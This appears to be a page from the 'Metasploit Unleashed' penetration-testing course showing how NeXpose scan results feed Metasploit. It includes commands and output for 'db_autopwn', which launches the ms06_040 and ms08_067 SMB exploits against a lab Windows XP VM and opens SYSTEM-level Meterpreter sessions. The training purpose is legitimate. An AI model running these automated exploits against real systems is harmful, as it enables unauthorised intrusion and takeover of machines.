<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Working With NeXpose</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Working
With NeXpose</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">With the acquisition of Metasploit by
Rapid7, there is now excellent
compatibility between Metasploit and the NeXpose vulnerability scanner.
Rapid7 has a community edition of their scanner that is available at <a
 href="http://www.rapid7.com/vulnerability-scanner.jsp"
 class="external free" rel="nofollow">http://www.rapid7.com/vulnerability-scanner.jsp</a>.
After we have installed and updated NeXpose, we run a full credentialed
scan against our vulnerable WinXP VM.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Nexpose_scan_results.PNG"
 class="image"><img alt="Nexpose scan results.PNG"
 src="http://www.offensive-security.com/w/images/0/06/Nexpose_scan_results.PNG"
 width="967" height="560"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We create a new report in NeXpose and save the scan results in 'NeXpose
Simple XML' format that we can later import into Metasploit. Next, we
fire up Metasploit, create a new database, and use the 'db_import'
command to auto-detect and import our scan results file.
<br>
<br>
</p>
<pre id="code">msf &gt; db_create<br>[*] Creating a new database instance...<br>[*] Successfully connected to the database<br>[*] File: /root/.msf3/sqlite3.db<br>msf &gt; db_import /root/report.xml<br>[*] Importing 'NeXpose Simple XML' data<br>[*] Importing host 192.168.1.161<br>[*] Successfully imported /root/report.xml</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now, running the 'db_services' and
'db_vulns' command will display
the all-important vulnerability information that Metasploit now has at
its disposal.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; db_services<br><br>Services<br>========<br><br>created_at               info                      name                               port  proto  state  updated_at               Host           Workspace<br>----------               ----                      ----                               ----  -----  -----  ----------               ----           ---------<br>2010-08-22 18:12:03 UTC                            ntp                                123   udp    open   2010-08-22 18:12:03 UTC  192.168.1.161  default<br>2010-08-22 18:12:05 UTC                            dce endpoint resolution            135   tcp    open   2010-08-22 18:12:05 UTC  192.168.1.161  default<br>2010-08-22 18:12:03 UTC                            cifs name service                  137   udp    open   2010-08-22 18:12:03 UTC  192.168.1.161  default<br>2010-08-22 18:12:03 UTC  Windows 2000 LAN Manager  cifs                               139   tcp    open   2010-08-22 18:12:03 UTC  192.168.1.161  default<br>2010-08-22 18:12:06 UTC                            snmp                               161   udp    open   2010-08-22 18:12:06 UTC  192.168.1.161  default<br>2010-08-22 18:12:05 UTC  Windows 2000 LAN Manager  cifs                               445   tcp    open   2010-08-22 18:12:05 UTC  192.168.1.161  default<br>2010-08-22 18:12:03 UTC                            microsoft remote display protocol  3389  tcp    open   2010-08-22 18:12:03 UTC  192.168.1.161  default<br><br>msf &gt; db_vulns<br>[*] Time: 2010-08-22 18:12:00 UTC Vuln: host=192.168.1.161 name=NEXPOSE-dcerpc-ms-netapi-netpathcanonicalize-dos refs=CVE-2006-3439,NEXPOSE-dcerpc-ms-netapi-netpathcanonicalize-dos<br>[*] Time: 2010-08-22 18:12:01 UTC Vuln: host=192.168.1.161 name=NEXPOSE-windows-hotfix-ms06-035 refs=CVE-2006-1314,CVE-2006-1315,SECUNIA-21007,NEXPOSE-windows-hotfix-ms06-035<br>[*] Time: 2010-08-22 18:12:03 UTC Vuln: host=192.168.1.161 name=NEXPOSE-cifs-nt-0001 refs=CVE-1999-0519,BID-494,URL-http://www.hsc.fr/ressources/presentations/null_sessions/,NEXPOSE-cifs-nt-0001<br>[*] Time: 2010-08-22 18:12:03 UTC Vuln: host=192.168.1.161 name=NEXPOSE-generic-icmp-timestamp refs=CVE-1999-0524,NEXPOSE-generic-icmp-timestamp<br>[*] Time: 2010-08-22 18:12:05 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NEXPOSE-windows-hotfix-ms09-001 refs=CVE-2008-4114,CVE-2008-4835,CVE-2008-4834,SECUNIA-31883,URL-http://www.vallejo.cc/proyectos/vista_SMB_write_DoS.htm,URL-http://www.zerodayinitiative.com/advisories/ZDI-09-001/,URL-http://www.zerodayinitiative.com/advisories/ZDI-09-002/,NEXPOSE-windows-hotfix-ms09-001<br>[*] Time: 2010-08-22 18:12:08 UTC Vuln: host=192.168.1.161 port=161 proto=udp name=NEXPOSE-snmp-read-0001 refs=CVE-1999-0186,CVE-1999-0254,CVE-1999-0472,CVE-1999-0516,CVE-1999-0517,CVE-2001-0514,CVE-2002-0109,BID-2807,NEXPOSE-snmp-read-0001<br>[*] Time: 2010-08-22 18:12:09 UTC Vuln: host=192.168.1.161 port=161 proto=udp name=NEXPOSE-snmp-read-0002 refs=CVE-1999-0516,CVE-1999-0517,CVE-2000-0147,BID-973,URL-ftp://ftp.sco.com/SSE/security_bulletins/SB-00.04a,URL-http://archives.neohapsis.com/archives/bugtraq/2000-02/0045.html,NEXPOSE-snmp-read-0002</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We could certainly use this
information to surgically attack
specific vulnerabilities but since we are in our own lab environment
and are not concerned about being stealthy, we will let 'db_autopwn'
take full advantage of the situation.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; db_autopwn -h<br>[*] Usage: db_autopwn [options]<br>        -h          Display this help text<br>        -t          Show all matching exploit modules<br>        -x          Select modules based on vulnerability references<br>        -p          Select modules based on open ports<br>        -e          Launch exploits against all matched targets<br>        -r          Use a reverse connect shell<br>        -b          Use a bind shell on a random port (default)<br>        -q          Disable exploit module output<br>        -R  [rank]  Only run modules with a minimal rank<br>        -I  [range] Only exploit hosts inside this range<br>        -X  [range] Always exclude hosts inside this range<br>        -PI [range] Only exploit hosts with these ports open<br>        -PX [range] Always exclude hosts with these ports open<br>        -m  [regex] Only run modules whose name matches the regex<br>        -T  [secs]  Maximum runtime for any exploit in seconds</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will tell db_autopwn to attack
all targets using the vulnerabilities that are gathered in the database
and watch the magic.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; db_autopwn -x -e<br>[*] (1/2 [0 sessions]): Launching exploit/windows/smb/ms06_040_netapi against 192.168.1.161:445...<br>[*] (2/2 [0 sessions]): Launching exploit/windows/smb/ms08_067_netapi against 192.168.1.161:445...<br>[*] (2/2 [0 sessions]): Waiting on 2 launched modules to finish execution...<br>[*] Meterpreter session 1 opened (192.168.1.101:42662 -&gt; 192.168.1.161:4265) at 2010-08-22 12:14:06 -0600<br>[*] (2/2 [1 sessions]): Waiting on 1 launched modules to finish execution...<br>[*] (2/2 [1 sessions]): Waiting on 0 launched modules to finish execution...<br><br>msf &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Just like that, we have a
Meterpreter session opened for us! </span><br
 style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; sessions -l<br><br>Active sessions<br>===============<br><br>  Id  Type         Information                            Connection<br>  --  ----         -----------                            ----------<br>  1   meterpreter  NT AUTHORITY\SYSTEM @ XEN-XP-SP2-BARE  192.168.1.101:42662 -&gt; 192.168.1.161:4265<br><br>msf &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: XEN-XP-SP2-BARE<br>OS      : Windows XP (Build 2600, Service Pack 2).<br>Arch    : x86<br>Language: en_US<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="NeXpose_from_msfconsole">NeXpose from msfconsole</span></h4>
<p style="color: rgb(0, 0, 0);">The Metasploit/NeXpose integration is
not limited to simply
importing scan results files. You can run NeXpose scans directly from
msfconsole by first making use of the 'nexpose' plugin.
<br>
<br>
</p>
<pre id="code">msf &gt; load nexpose<br><br> ____             _     _ _____   _   _     __  __<br>|  _ \ __ _ _ __ (_) __| |___  | | \ | | ___\ \/ /_ __   ___  ___  ___<br>| |_) / _` | '_ \| |/ _` |  / /  |  \| |/ _ \\  /| '_ \ / _ \/ __|/ _ \<br>|  _ &lt; (_| | |_) | | (_| | / /   | |\  |  __//  \| |_) | (_) \__ \  __/<br>|_| \_\__,_| .__/|_|\__,_|/_/    |_| \_|\___/_/\_\ .__/ \___/|___/\___|<br>           |_|                                   |_|<br><br><br>[*] NeXpose integration has been activated<br>[*] Successfully loaded plugin: nexpose<br><br>msf &gt; help<br><br>NeXpose Commands<br>================<br><br>    Command             Description<br>    -------             -----------<br>    nexpose_activity    Display any active scan jobs on the NeXpose instance<br>    nexpose_connect     Connect to a running NeXpose instance ( user:pass@host[:port] )<br>    nexpose_disconnect  Disconnect from an active NeXpose instance<br>    nexpose_discover    Launch a scan but only perform host and minimal service discovery<br>    nexpose_dos         Launch a scan that includes checks that can crash services and devices (caution)<br>    nexpose_exhaustive  Launch a scan covering all TCP ports and all authorized safe checks<br>    nexpose_scan        Launch a NeXpose scan against a specific IP range and import the results</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Before running a scan against a
target, we first need to connect to
our server running NeXpose by using the 'nexpose_connect' command along
with the credentials for the NeXpose instance. Note that you will have
to append 'ok' to the end of the connect string to acknowledge that the
SSL connections are not verified.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; nexpose_connect dookie:s3cr3t@192.168.1.152<br>[-] Warning: SSL connections are not verified in this release, it is possible for an attacker<br>[-]          with the ability to man-in-the-middle the NeXpose traffic to capture the NeXpose<br>[-]          credentials. If you are running this on a trusted network, please pass in 'ok'<br>[-]          as an additional parameter to this command.<br>msf &gt; nexpose_connect dookie:s3cr3t@192.168.1.152 ok<br>[*] Connecting to NeXpose instance at 192.168.1.152:3780 with username dookie...<br>msf &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that we are connected to our
server, we can run a vulnerability scan right from within Metasploit.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; nexpose_discover -h<br>Usage: nexpose_scan [options]<br><br>OPTIONS:<br><br>    -E   Exclude hosts in the specified range from the scan<br>    -I   Only scan systems with an address within the specified range<br>    -P        Leave the scan data on the server when it completes (this counts against the maximum licensed IPs)<br>    -R   Specify a minimum exploit rank to use for automated exploitation<br>    -X        Automatically launch all exploits by matching reference and port after the scan completes (unsafe)<br>    -c   Specify credentials to use against these targets (format is type:user:pass[@host[:port]]<br>    -d        Scan hosts based on the contents of the existing database<br>    -h        This help menu<br>    -n   The maximum number of IPs to scan at a time (default is 32)<br>    -s   The directory to store the raw XML files from the NeXpose instance (optional)<br>    -t   The scan template to use (default:pentest-audit options:full-audit,exhaustive-audit,discovery,aggressive-discovery,dos-audit)<br>    -v        Display diagnostic information about the scanning process<br>    -x        Automatically launch all exploits by matching reference after the scan completes (unsafe)<br><br>msf &gt; nexpose_discover 192.168.1.161<br>[*] Scanning 1 addresses with template aggressive-discovery in sets of 32<br>[*] Completed the scan of 1 addresses<br>msf &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Again, we run 'db_services' and
'db_vulns' and we can see that the
results are of the same quality as those we imported via the XML file.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; db_services<br><br>Services<br>========<br><br>created_at               info                      name                               port  proto  state  updated_at               Host           Workspace<br>----------               ----                      ----                               ----  -----  -----  ----------               ----           ---------<br>2010-08-22 18:24:28 UTC                            ntp                                123   udp    open   2010-08-22 18:24:28 UTC  192.168.1.161  default<br>2010-08-22 18:24:30 UTC                            dce endpoint resolution            135   tcp    open   2010-08-22 18:24:30 UTC  192.168.1.161  default<br>2010-08-22 18:24:28 UTC                            cifs name service                  137   udp    open   2010-08-22 18:24:28 UTC  192.168.1.161  default<br>2010-08-22 18:24:28 UTC  Windows 2000 LAN Manager  cifs                               139   tcp    open   2010-08-22 18:24:28 UTC  192.168.1.161  default<br>2010-08-22 18:24:30 UTC                            snmp                               161   udp    open   2010-08-22 18:24:30 UTC  192.168.1.161  default<br>2010-08-22 18:24:30 UTC  Windows 2000 LAN Manager  cifs                               445   tcp    open   2010-08-22 18:24:30 UTC  192.168.1.161  default<br>2010-08-22 18:24:28 UTC                            microsoft remote display protocol  3389  tcp    open   2010-08-22 18:24:28 UTC  192.168.1.161  default<br><br>msf &gt; db_vulns<br>[*] Time: 2010-08-22 18:24:25 UTC Vuln: host=192.168.1.161 name=NEXPOSE-dcerpc-ms-netapi-netpathcanonicalize-dos refs=CVE-2006-3439,NEXPOSE-dcerpc-ms-netapi-netpathcanonicalize-dos<br>[*] Time: 2010-08-22 18:24:26 UTC Vuln: host=192.168.1.161 name=NEXPOSE-windows-hotfix-ms06-035 refs=CVE-2006-1314,CVE-2006-1315,SECUNIA-21007,NEXPOSE-windows-hotfix-ms06-035<br>[*] Time: 2010-08-22 18:24:27 UTC Vuln: host=192.168.1.161 name=NEXPOSE-cifs-nt-0001 refs=CVE-1999-0519,BID-494,URL-http://www.hsc.fr/ressources/presentations/null_sessions/,NEXPOSE-cifs-nt-0001<br>[*] Time: 2010-08-22 18:24:28 UTC Vuln: host=192.168.1.161 name=NEXPOSE-generic-icmp-timestamp refs=CVE-1999-0524,NEXPOSE-generic-icmp-timestamp<br>[*] Time: 2010-08-22 18:24:30 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NEXPOSE-windows-hotfix-ms09-001 refs=CVE-2008-4114,CVE-2008-4835,CVE-2008-4834,SECUNIA-31883,URL-http://www.vallejo.cc/proyectos/vista_SMB_write_DoS.htm,URL-http://www.zerodayinitiative.com/advisories/ZDI-09-001/,URL-http://www.zerodayinitiative.com/advisories/ZDI-09-002/,NEXPOSE-windows-hotfix-ms09-001<br>[*] Time: 2010-08-22 18:24:33 UTC Vuln: host=192.168.1.161 port=161 proto=udp name=NEXPOSE-snmp-read-0001 refs=CVE-1999-0186,CVE-1999-0254,CVE-1999-0472,CVE-1999-0516,CVE-1999-0517,CVE-2001-0514,CVE-2002-0109,BID-2807,NEXPOSE-snmp-read-0001<br>[*] Time: 2010-08-22 18:24:35 UTC Vuln: host=192.168.1.161 port=161 proto=udp name=NEXPOSE-snmp-read-0002 refs=CVE-1999-0516,CVE-1999-0517,CVE-2000-0147,BID-973,URL-ftp://ftp.sco.com/SSE/security_bulletins/SB-00.04a,URL-http://archives.neohapsis.com/archives/bugtraq/2000-02/0045.html,NEXPOSE-snmp-read-0002</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Because it is so much fun, we will
let db_autopwn take over again.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; db_autopwn -x -e<br>[*] (1/2 [0 sessions]): Launching exploit/windows/smb/ms06_040_netapi against 192.168.1.161:445...<br>[*] (2/2 [0 sessions]): Launching exploit/windows/smb/ms08_067_netapi against 192.168.1.161:445...<br>[*] (2/2 [0 sessions]): Waiting on 2 launched modules to finish execution...<br>[*] (2/2 [1 sessions]): Waiting on 1 launched modules to finish execution...<br>[*] Meterpreter session 2 opened (192.168.1.101:51373 -&gt; 192.168.1.161:35156) at 2010-08-22 12:26:49 -0600<br>[*] (2/2 [1 sessions]): Waiting on 0 launched modules to finish execution...<br><br>msf &gt; sessions -l<br><br>Active sessions<br>===============<br><br>  Id  Type         Information                            Connection<br>  --  ----         -----------                            ----------<br>  2   meterpreter  NT AUTHORITY\SYSTEM @ XEN-XP-SP2-BARE  192.168.1.101:51373 -&gt; 192.168.1.161:35156<br><br>msf &gt; sessions -i 2<br>[*] Starting interaction with 2...<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: XEN-XP-SP2-BARE<br>OS      : Windows XP (Build 2600, Service Pack 2).<br>Arch    : x86<br>Language: en_US<br><u>meterpreter</u> &gt; exit<br><br>[*] Meterpreter session 2 closed.  Reason: User exit<br>msf &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As we can see, this integration,
while still in its early stages, is very beneficial and adds incredible
power to Metasploit.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning"
 title="Vulnerability Scanning">Vulnerability Scanning</a></div>
</body>
</html>
